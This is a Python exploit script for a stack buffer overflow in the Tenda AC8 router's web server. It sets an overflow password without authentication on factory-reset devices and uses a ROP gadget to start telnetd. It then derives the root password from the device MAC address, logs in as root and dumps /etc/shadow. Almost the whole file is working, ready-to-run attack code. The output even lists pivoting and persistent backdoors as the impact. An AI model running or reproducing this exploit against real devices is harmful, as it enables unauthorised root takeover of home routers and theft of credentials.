#!/usr/bin/env python3
"""
Tenda AC8 - fromSysToolChangePwd Stack Buffer Overflow → Remote Root Shell

Vulnerability: Stack buffer overflow in fromSysToolChangePwd() in /bin/httpd.
GetValue("sys.userpass", local_2c) reads the stored password into a 36-byte
stack buffer. A password longer than 36 bytes overflows saved $s8 and $ra,
hijacking control flow on function return.

Exploit Strategy: 43-byte overflow with ROP to TendaTelnet's doSystemCmd() call.
  - Bytes 0-35:  Fill local_2c[36] buffer (padding)
  - Bytes 36-39: Overwrite saved $s8 (don't care, set to 0x42424242)
  - Bytes 40-42: Overwrite lower 3 bytes of saved $ra
  - Byte 43:     Null terminator sets MSB of $ra to 0x00
  - Result:      $ra = 0x004c32dc (TendaTelnet doSystemCmd gadget)

ROP Gadget @ 0x4c32dc (inside TendaTelnet):
  004c32dc  lw v0,-0x7850(gp)     ; v0 = rodata pointer from GOT (gp intact)
  004c32e0  nop
  004c32e4  addiu a0,v0,-0x160    ; a0 = "telnetd &"
  004c32e8  lw v0,-0x7088(gp)     ; v0 = doSystemCmd() address from GOT
  004c32ec  nop
  004c32f0  or t9,v0,zero         ; t9 = doSystemCmd
  004c32f4  jalr t9               ; doSystemCmd("telnetd &") — STARTS TELNETD!
  004c32f8  nop
  004c32fc  lw gp,0x10(s8)        ; CRASH HERE (s8=0x42424242, post-exploit)

Attack flow (factory-reset device, no password set):
  Step 1: POST /goform/SysToolChangePwd — store 43-byte overflow password
          (no auth needed when g_Pass is empty)
  Step 2: POST /login/Auth — login with the overflow password, get cookie
  Step 3: POST /goform/SysToolChangePwd — trigger the overflow + ROP
  Step 4: Connect to telnet (port 23) — verify telnetd is running
  Step 5: Get MAC from ARP → derive root password → login as root

Why this works:
  - $gp remains 0x52e810 (fromSysToolChangePwd epilogue doesn't modify it)
  - All GOT-relative loads resolve correctly (rodata pointer, doSystemCmd)
  - Only uses $gp, $v0, $a0, $t9 before the call — no $s8/$sp dependency
  - "telnetd &" is backgrounded, so it survives the post-call crash
  - 0x004c32dc in LE: DC 32 4C 00 — MSB null from string terminator

Telnet root login:
  - Root password is derived from the device MAC address (cnsl_safe algorithm)
  - MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64
  - MAC auto-detected from ARP table (we already talked to the router)
  - Special case: MAC 00:90:4c:88:88:88 → password "Fireitup"

Expected result:
  - telnetd starts on port 23
  - httpd crashes at epc=004c32fc (AFTER doSystemCmd returns)
  - Root login via telnet with MAC-derived password
  - Full device compromise: read/write filesystem, access credentials

Binary protections: NX enabled, NO canary, NO PIE, NO RELRO (score 1/5)
Static base: 0x00400000 (fixed, no ASLR on main binary)
$gp: 0x0052e810 (consistent across all httpd functions)

Target: Tenda AC8 V4 firmware
"""

import argparse
import base64
import re
import socket
import struct
import subprocess
import sys
import telnetlib
import time
from urllib.parse import quote_from_bytes, urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Exploit Parameters ───────────────────────────────────────────────
BUFFER_SIZE = 36          # local_2c[36] at sp+0x2c
S8_OFFSET = 36            # saved $s8 at sp+0x50 (0x50 - 0x2c = 0x24 = 36)
RA_OFFSET = 40            # saved $ra at sp+0x54 (0x54 - 0x2c = 0x28 = 40)

# ROP target: TendaTelnet's doSystemCmd("telnetd &") call at 0x004c32dc
# Little-endian bytes: dc 32 4c 00 (MSB is null, provided by string terminator)
ROP_ADDR = 0x004c32dc

DEFAULT_USERNAME = "admin"
TIMEOUT = 10
FORM_CONTENT_TYPE = {"Content-Type": "application/x-www-form-urlencoded"}


def encode_form(params):
    """
    Encode form parameters as application/x-www-form-urlencoded with raw bytes.

    Unlike requests' default dict encoding (which converts strings to UTF-8,
    mangling bytes like \\xb0 into \\xc2\\xb0), this percent-encodes each raw
    byte directly: \\xb0 → %B0, \\xe4 → %E4, etc.
    """
    parts = []
    for key, value in params.items():
        if isinstance(value, bytes):
            parts.append(f"{key}={quote_from_bytes(value, safe='')}")
        else:
            parts.append(f"{key}={quote_from_bytes(value.encode('ascii'), safe='')}")
    return "&".join(parts)


def build_payload():
    """
    Build the 43-byte overflow payload.

    Memory layout after GetValue("sys.userpass", local_2c) overflow:
      sp+0x2c: [AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA]  36 bytes (local_2c)
      sp+0x50: [BBBB]                                            4 bytes  (saved $s8)
      sp+0x54: [dc 32 4c 00]                                    4 bytes  (saved $ra)
                ^^^^^^^^ ^^
                3 bytes   null terminator → $ra = 0x004c32dc
    """
    payload = b"A" * BUFFER_SIZE                    # 36 bytes: fill buffer
    payload += b"BBBB"                              # 4 bytes: overwrite $s8
    payload += struct.pack("<I", ROP_ADDR)[:3]      # 3 bytes: lower 3 bytes of $ra
    # Null terminator (byte 44) sets MSB of $ra to 0x00 → $ra = 0x004c32dc
    return payload  # 43 bytes total


def check_alive(base_url):
    """Check if httpd is responding."""
    try:
        r = requests.get(base_url, timeout=TIMEOUT, allow_redirects=True)
        return True
    except requests.exceptions.RequestException:
        return False


def step1_store_overflow_password(base_url, session, payload):
    """
    Store the 43-byte overflow payload as the device password.

    On factory reset, g_Pass == '\\0', so R7WebsSecurityHandler allows
    unauthenticated access. fromSysToolChangePwd:
      1. GetValue("sys.userpass", local_2c) → reads "" (empty, no overflow yet)
      2. strcmp("", SYSOPS="") → match (old password correct)
      3. strcmp(SYSPS, SYSPS2) → match (confirmation matches)
      4. strcmp("", SYSPS) → not equal (new != old, OK)
      5. SetValue("sys.userpass", payload) → stores 43-byte password in cfm
      6. getwebuserpwd(1) → loads payload into g_Pass (global overflow, no crash)
    """
    print(f"[*] Step 1: Storing {len(payload)}-byte overflow password...")

    # Use raw byte encoding to avoid UTF-8 mangling of \xb0, \xe4 etc.
    body = encode_form({
        "SYSOPS": b"",          # Current password (empty on factory reset)
        "SYSPS": payload,       # New password: 43-byte ROP payload
        "SYSPS2": payload,      # Confirm
    })

    try:
        r = session.post(
            f"{base_url}/goform/SysToolChangePwd",
            data=body,
            headers=FORM_CONTENT_TYPE,
            allow_redirects=False,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

    print(f"    Response: HTTP {r.status_code}")

    if r.status_code in (200, 301, 302):
        print(f"[+] Password stored successfully ({len(payload)} bytes)")
        print(f"    g_Pass now contains: 36x'A' + 'BBBB' + \\xdc\\x32\\x4c")
        return True

    print(f"[-] Unexpected response: {r.status_code}")
    print(f"    Body: {r.text[:300]}")
    return False


def step2_login(base_url, session, payload):
    """
    Login with the overflow password to get a session cookie.

    R7WebsSecurityHandler /login/Auth:
      1. websGetVar("username") + websGetVar("password")
      2. strcmp(username, g_User) → "admin" == "admin"
      3. strcmp(password, &g_Pass) → payload == payload (plaintext match!)
      4. Stores client IP in loginUserInfo, generates cookie
      5. websRedirectOpCookie → Set-Cookie header with session token
    """
    print(f"[*] Step 2: Logging in with overflow password...")

    # Use raw byte encoding — password contains \xdc\x32\x4c
    body = encode_form({
        "username": DEFAULT_USERNAME,
        "password": payload,
    })

    try:
        r = session.post(
            f"{base_url}/login/Auth",
            data=body,
            headers=FORM_CONTENT_TYPE,
            allow_redirects=False,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Login request failed: {e}")
        return False

    print(f"    Response: HTTP {r.status_code}")
    print(f"    Headers: {dict(r.headers)}")

    # Check for cookie
    set_cookie = r.headers.get("Set-Cookie", "")
    if "password=" in set_cookie:
        print(f"[+] Login successful! Cookie received.")
        print(f"    Set-Cookie: {set_cookie[:80]}...")
        return True

    if session.cookies.get("password"):
        print(f"[+] Login successful! Cookie in jar.")
        return True

    location = r.headers.get("Location", "")
    if "main.html" in location or "index.html" in location:
        print(f"[+] Login successful! Redirect to {location}")
        return True

    print(f"[-] Login may have failed (no cookie detected).")
    print(f"    Body: {r.text[:200]}")
    print(f"    Proceeding to Step 3 anyway...")
    return True  # Try the crash regardless


def step3_trigger_rce(base_url, session):
    """
    Trigger the stack buffer overflow → ROP → doSystemCmd("telnetd &").

    fromSysToolChangePwd (0x4b6ecc):
      GetValue("sys.userpass", local_2c)  ← reads 43 bytes into 36-byte buffer

    Overflow overwrites:
      saved $s8 = 0x42424242 ("BBBB")
      saved $ra = 0x004c32dc (TendaTelnet doSystemCmd gadget)

    Function epilogue (0x4b7328):
      or  sp, s8, zero       ; sp restored from $s8 REGISTER (unchanged)
      lw  ra, 0x54(sp)       ; ra = overwritten value = 0x004c32dc
      lw  s8, 0x50(sp)       ; s8 = 0x42424242
      addiu sp, sp, 0x58
      jr  ra                 ; JUMP TO TENDATELNET GADGET

    At 0x4c32dc (TendaTelnet):
      lw   v0, -0x7850(gp)   ; load rodata pointer (gp=0x52e810 still valid)
      addiu a0, v0, -0x160   ; a0 = "telnetd &"
      lw   v0, -0x7088(gp)   ; v0 = doSystemCmd() from GOT
      or   t9, v0, zero
      jalr t9                ; *** doSystemCmd("telnetd &") — STARTS TELNETD! ***
      nop
      lw   gp, 0x10(s8)      ; s8=0x42424242 → crash AFTER telnetd started

    SYSOPS/SYSPS/SYSPS2 values are irrelevant — the overflow happens
    BEFORE any password comparison in the function.
    """
    print(f"[*] Step 3: Triggering overflow → ROP → doSystemCmd(\"telnetd &\")...")
    print(f"    POST {base_url}/goform/SysToolChangePwd")
    print(f"    GetValue reads {BUFFER_SIZE + 4 + 3 + 1} bytes into {BUFFER_SIZE}-byte buffer")
    print(f"    $ra → 0x{ROP_ADDR:08x} (TendaTelnet doSystemCmd gadget)")

    # SYSOPS/SYSPS/SYSPS2 values don't matter — the overflow happens at
    # GetValue() before any comparison. The function finishes normally
    # (websRedirect), then the epilogue loads our corrupted $ra and jumps.
    body = encode_form({
        "SYSOPS": b"anything",
        "SYSPS": b"x",
        "SYSPS2": b"x",
    })

    try:
        r = session.post(
            f"{base_url}/goform/SysToolChangePwd",
            data=body,
            headers=FORM_CONTENT_TYPE,
            allow_redirects=False,
            timeout=TIMEOUT,
        )
        print(f"    Response: HTTP {r.status_code}")
        print(f"[-] Got a response. Check UART for crash evidence and try telnet.")
        print(f"    Body: {r.text[:200]}")
        return "unknown"
    except requests.exceptions.ConnectionError:
        print(f"[+] Connection reset — httpd crashed!")
        return "crashed"
    except requests.exceptions.ReadTimeout:
        print(f"[+] Read timeout — httpd likely crashed!")
        return "crashed"
    except requests.exceptions.ChunkedEncodingError:
        print(f"[+] Connection broken — httpd crashed!")
        return "crashed"


def verify_crash(base_url):
    """Verify httpd is down."""
    print(f"[*] Verifying httpd is down...")
    time.sleep(2)
    for _ in range(3):
        try:
            requests.get(f"{base_url}/", timeout=3)
            time.sleep(1)
        except requests.exceptions.RequestException:
            print(f"[+] Confirmed: httpd is not responding.")
            return True
    print(f"[-] httpd still responding (watchdog may have restarted it).")
    return False


def get_mac_from_arp(target_host):
    """
    Get the target's MAC address from the local ARP table.

    We've already communicated with the router (Steps 1-3), so its MAC
    should be in the ARP cache. Works on Linux and macOS.
    """
    try:
        # Try 'ip neigh' first (Linux)
        result = subprocess.run(
            ["ip", "neigh", "show", target_host],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0 and result.stdout.strip():
            # Format: "192.168.0.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE"
            match = re.search(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", result.stdout)
            if match:
                return match.group(1).lower()
    except FileNotFoundError:
        pass

    try:
        # Fallback: 'arp -n' (Linux/macOS)
        result = subprocess.run(
            ["arp", "-n", target_host],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            match = re.search(r"([0-9a-fA-F]{2}(?:[:-][0-9a-fA-F]{2}){5})", result.stdout)
            if match:
                return match.group(1).replace("-", ":").lower()
    except FileNotFoundError:
        pass

    return None


def derive_telnet_password(mac):
    """
    Derive the UART/telnet root password from the device MAC address.

    Algorithm found in cnsl_safe binary:
      1. Take MAC octets [4] and [5] (0-indexed)
      2. Format: "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}"
      3. Base64-encode the result

    Special case: MAC 00:90:4c:88:88:88 → password is "Fireitup"
    Fallback MAC (factory flash read fails): 00:11:22:33:44:55
    """
    octets = [int(b, 16) for b in mac.split(":")]

    if octets == [0x00, 0x90, 0x4C, 0x88, 0x88, 0x88]:
        return "Fireitup"

    pre_encode = f"{octets[4]:02x}1w6lm2p_955{octets[5]:02x}"
    return base64.b64encode(pre_encode.encode()).decode()


def step4_verify_telnet(target_host):
    """
    Verify root shell by connecting to telnet (port 23).

    After the ROP gadget calls doSystemCmd("telnetd &"), telnetd starts
    as a background daemon on port 23. Since it runs as root with no
    authentication, connecting gives immediate root shell access.
    """
    print(f"[*] Step 4: Verifying telnet access on {target_host}:23...")
    print(f"    Waiting 3 seconds for telnetd to start...")
    time.sleep(3)

    for attempt in range(3):
        try:
            sock = socket.create_connection((target_host, 23), timeout=5)
            # Read whatever banner/prompt telnetd sends
            banner = sock.recv(1024)
            sock.close()
            print(f"[+] TELNET IS OPEN on {target_host}:23!")
            if banner:
                print(f"    Banner: {banner[:200]}")
            return True
        except ConnectionRefusedError:
            print(f"    Attempt {attempt + 1}/3: Connection refused, retrying...")
            time.sleep(2)
        except socket.timeout:
            print(f"    Attempt {attempt + 1}/3: Timeout, retrying...")
            time.sleep(2)
        except OSError as e:
            print(f"    Attempt {attempt + 1}/3: {e}, retrying...")
            time.sleep(2)

    print(f"[-] Could not connect to telnet. Check UART for telnetd status.")
    return False


def step5_telnet_login(target_host, password):
    """
    Login to telnet with root and the MAC-derived password.

    Tenda's telnetd uses /bin/login which authenticates against /etc/shadow.
    The root password is set by cnsl_safe at boot, derived from the MAC.
    """
    print(f"[*] Step 5: Logging into telnet as root...")
    print(f"    Password: {password}")

    try:
        tn = telnetlib.Telnet(target_host, 23, timeout=10)

        # Wait for login prompt
        tn.read_until(b"login: ", timeout=5)
        tn.write(b"root\n")

        # Wait for password prompt
        tn.read_until(b"assword:", timeout=5)
        tn.write(password.encode() + b"\n")

        # Read response — look for shell prompt or welcome message
        time.sleep(1)
        response = tn.read_very_eager()
        response_text = response.decode("ascii", errors="replace")

        if "incorrect" in response_text.lower() or "denied" in response_text.lower():
            print(f"[-] Login failed — password may be wrong.")
            print(f"    Response: {response_text.strip()[:200]}")
            tn.close()
            return False

        # Run commands to confirm shell access
        tn.write(b"cat /proc/version\n")
        time.sleep(0.5)
        ver_output = tn.read_very_eager().decode("ascii", errors="replace")

        print(f"[+] ROOT SHELL ACTIVE!")
        if ver_output.strip():
            print(f"    $ cat /proc/version")
            print(f"    {ver_output.strip()[:200]}")

        tn.write(b"cat /etc/shadow\n")
        time.sleep(0.5)
        shadow_output = tn.read_very_eager().decode("ascii", errors="replace")
        if shadow_output.strip():
            print(f"    $ cat /etc/shadow")
            print(f"    {shadow_output.strip()[:500]}")

        tn.close()
        return True

    except EOFError:
        print(f"[-] Telnet connection closed unexpectedly.")
        return False
    except Exception as e:
        print(f"[-] Telnet login failed: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Tenda AC8 fromSysToolChangePwd Stack Overflow → Remote Root Shell"
    )
    parser.add_argument(
        "--target", default="http://192.168.0.1",
        help="Target URL (default: http://192.168.0.1)",
    )
    parser.add_argument(
        "--current-password", default="",
        help="Current device password (empty string for factory reset)",
    )
    parser.add_argument(
        "--mac", default=None,
        help="Device MAC address (e.g. AA:BB:CC:DD:EE:FF). Auto-detected from ARP if omitted.",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    target_host = urlparse(base_url).hostname
    payload = build_payload()

    print("=" * 72)
    print("  Tenda AC8 — fromSysToolChangePwd Stack Overflow → Root Shell")
    print("=" * 72)
    print()
    print(f"  Target:         {base_url}")
    print(f"  Payload size:   {len(payload)} bytes")
    print(f"  Buffer size:    {BUFFER_SIZE} bytes (local_2c)")
    print(f"  $s8 overwrite:  0x42424242 ('BBBB')")
    print(f"  $ra overwrite:  0x{ROP_ADDR:08x} (TendaTelnet → doSystemCmd())")
    print(f"  ROP effect:     doSystemCmd(\"telnetd &\") → root shell on port 23")
    print(f"  Payload hex:    {payload.hex()}")
    print()

    # Verify target is up
    print("[*] Checking target is reachable...")
    if not check_alive(base_url):
        print("[-] Cannot reach httpd. Check target IP.")
        sys.exit(1)
    print("[+] httpd is responding.")
    print()

    session = requests.Session()

    # Step 1: Store the overflow password
    if not step1_store_overflow_password(base_url, session, payload):
        print("\n[-] Step 1 failed. Is the device factory-reset?")
        sys.exit(1)
    print()
    time.sleep(1)

    # Step 2: Login with the overflow password
    step2_login(base_url, session, payload)
    print()
    time.sleep(1)

    # Step 3: Trigger overflow → ROP → doSystemCmd("telnetd &")
    result = step3_trigger_rce(base_url, session)
    print()

    if result == "crashed":
        verify_crash(base_url)

    # Step 4: Verify telnet port is open
    telnet_ok = step4_verify_telnet(target_host)
    print()

    # Step 5: Get MAC, derive password, login via telnet
    login_ok = False
    mac = None
    password = None
    if telnet_ok:
        # Get MAC address
        if args.mac:
            mac = args.mac.strip().lower().replace("-", ":")
            print(f"[*] Using provided MAC: {mac}")
        else:
            print(f"[*] Looking up MAC address from ARP table...")
            mac = get_mac_from_arp(target_host)
            if mac:
                print(f"[+] Found MAC: {mac}")
            else:
                print(f"[-] Could not find MAC in ARP table.")
                print(f"    Use --mac AA:BB:CC:DD:EE:FF to provide it manually.")

        if mac:
            password = derive_telnet_password(mac)
            print(f"[+] Derived root password: {password}")
            print()
            login_ok = step5_telnet_login(target_host, password)

    # Summary
    print()
    print("=" * 72)
    if login_ok:
        print("  RESULT: ROOT SHELL OBTAINED — FULL DEVICE COMPROMISE")
        print()
        print("  Kill chain:")
        print(f"    1. GetValue read 43 bytes into local_2c[{BUFFER_SIZE}]")
        print(f"    2. Overflow: $ra = 0x{ROP_ADDR:08x} (TendaTelnet)")
        print(f"    3. jr $ra → doSystemCmd(\"telnetd &\") → telnetd on port 23")
        print(f"    4. MAC {mac} → root password: {password}")
        print(f"    5. Authenticated root shell via telnet")
        print()
        print(f"  Reconnect:    telnet {target_host}")
        print(f"  Login:        root / {password}")
        print(f"  Impact:       read/write filesystem, access credentials,")
        print(f"                pivot to network, install persistent backdoor")
    elif telnet_ok:
        print("  RESULT: TELNET IS OPEN (telnetd started successfully)")
        print()
        print(f"  Port 23 is listening but login {('needs MAC' if not mac else 'failed')}.")
        if mac and password:
            print(f"  Tried:  root / {password}")
        print()
        print(f"  Connect manually:  telnet {target_host}")
        print(f"  Login as:          root")
        if not mac:
            print(f"  Get password:      python3 uart_password.py <MAC>")
            print(f"  Find MAC:          check router label or run: arp -n {target_host}")
    elif result == "crashed":
        print("  RESULT: httpd CRASHED (exploit likely executed)")
        print()
        print(f"  Telnet not reachable — telnetd may not have started.")
        print(f"  Check UART for crash at epc=004c32fc (proves ROP executed).")
    else:
        print("  RESULT: No connection error detected.")
        print("  Check UART console and try:")
        print(f"    telnet {target_host}")
    print("=" * 72)


if __name__ == "__main__":
    main()

